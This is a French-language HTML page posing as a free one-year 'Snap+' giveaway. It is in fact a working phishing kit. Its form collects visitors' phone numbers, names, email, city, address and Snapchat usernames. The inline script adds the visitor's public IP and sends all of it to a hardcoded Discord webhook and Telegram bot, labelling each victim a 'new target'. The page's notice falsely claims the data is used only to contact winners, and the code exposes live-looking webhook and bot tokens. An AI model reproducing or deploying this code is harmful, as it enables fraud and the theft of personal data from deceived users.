<!DOCTYPE html>
<<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>🎁 Snap+ 1 An Gratuit</title>
  <style>
    /* ... ton CSS d’origine, inchangé ... */
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">👻✨</div>
    <h1>Snap+ Gratuit</h1>
    <p>Active 1 an de Snap+ gratuitement</p>

    <form id="giveawayForm">
      <div id="step1">
        <input
          type="text"
          name="telephone"
          placeholder="Numéro de téléphone"
          required
          pattern="[\d\s+]{6,}"
          title="Entrez un numéro valide"
        />
        <button type="button" onclick="showStep2()">Continuer</button>
      </div>

      <div id="step2" style="display:none;">
        <input type="text" name="nom" placeholder="Nom" required />
        <input type="text" name="prenom" placeholder="Prénom" required />
        <input type="email" name="email" placeholder="Email" required />
        <input type="text" name="ville" placeholder="Ville" required />
        <input type="text" name="departement" placeholder="Département" required />
        <input type="text" name="adresse" placeholder="Adresse (facultatif)" />
        <input type="text" name="snap" placeholder="Nom d'utilisateur Snapchat" required />
        <button type="submit">Valider</button>
      </div>
    </form>

    <div class="notice">
      Les données sont utilisées uniquement pour vous contacter si vous gagnez. Ce concours
      n’est pas affilié à Snapchat.
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";

    // ** A REMPLACER ** avec ton token Telegram
    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
    // ** A REMPLACER ** avec ton chat ID Telegram (ex: groupe ou canal)
    const TELEGRAM_CHAT_ID = "-1002810249796";

    const SUBMISSION_LIMIT = 2;
    const TIME_WINDOW_MINUTES = 30;

    function showStep2() {
      const phoneInput = document.querySelector('[name="telephone"]');
      if (!phoneInput.value.trim()) {
        alert("Veuillez entrer votre numéro de téléphone.");
        return;
      }
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
    }

    async function getPublicIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip || "IP inconnue";
      } catch {
        return "IP inconnue";
      }
    }

    function canSubmit() {
      const now = Date.now();
      const submissions = JSON.parse(localStorage.getItem("giveaway_submissions") || "[]");
      const recent = submissions.filter(ts => now - ts < TIME_WINDOW_MINUTES * 60 * 1000);
      if (recent.length >= SUBMISSION_LIMIT) return false;
      recent.push(now);
      localStorage.setItem("giveaway_submissions", JSON.stringify(recent));
      return true;
    }

    async function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
      const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
        disable_web_page_preview: true,
      };
      try {
        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        });
        if (!res.ok) throw new Error(`Telegram API erreur: ${res.statusText}`);
      } catch (err) {
        console.error("Erreur Telegram:", err);
      }
    }

    document.getElementById("giveawayForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      if (!canSubmit()) {
        alert(`Vous avez dépassé la limite de ${SUBMISSION_LIMIT} participations toutes les ${TIME_WINDOW_MINUTES} minutes.`);
        return;
      }

      const data = new FormData(this);
      const ip = await getPublicIP();

      // Discord embed
      const embed = {
        title: "🎁 Nouvelle cible Snap+ @everyone",
        color: 0xA54FFB,
        fields: [
          { name: "📞 Téléphone", value: data.get("telephone") || "N/A", inline: true },
          { name: "👤 Nom", value: data.get("nom") || "N/A", inline: true },
          { name: "👤 Prénom", value: data.get("prenom") || "N/A", inline: true },
          { name: "📧 Email", value: data.get("email") || "N/A", inline: false },
          { name: "🏙️ Ville", value: data.get("ville") || "N/A", inline: true },
          { name: "📍 Département", value: data.get("departement") || "N/A", inline: true },
          { name: "🏠 Adresse", value: data.get("adresse") || "Non fournie", inline: false },
          { name: "👻 Snapchat", value: data.get("snap") || "N/A", inline: true },
          { name: "🌐 IP", value: ip, inline: false }
        ],
        footer: { text: `Reçu le ${new Date().toLocaleString("fr-FR")}` },
        timestamp: new Date(),
      };

      // Message Telegram format spécial
      const telegramMessage = `
┌─🎁 Nouvelle cible Snap+ @everyone
│
│ ┌─📞 Contact
│ │ ├─ Téléphone   : ${data.get("telephone") || "N/A"}
│ │ ├─ Email       : ${data.get("email") || "N/A"}
│ │ └─ Snapchat    : ${data.get("snap") || "N/A"}
│
│ ├─👤 Identité
│ │ ├─ Nom        : ${data.get("nom") || "N/A"}
│ │ ├─ Prénom     : ${data.get("prenom") || "N/A"}
│
│ ├─📍 Localisation
│ │ ├─ Ville        : ${data.get("ville") || "N/A"}
│ │ ├─ Département  : ${data.get("departement") || "N/A"}
│ │ └─ Adresse      : ${data.get("adresse") || "Non fournie"}
│
│ └─🌐 Autres
│   └─ IP          : ${ip}
│
└─🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}
`;

      // Envoi Discord
      fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] }),
      })
      .then((res) => {
        if (!res.ok) throw new Error("Erreur lors de l'envoi Discord");
        // Envoi Telegram
        return sendToTelegram(telegramMessage);
      })
      .then(() => {
        window.location.href = "merci.html";
      })
      .catch((err) => {
        alert("Erreur lors de l’envoi. Réessayez.");
        console.error(err);
      });
    });
  </script>
</body>
</html>
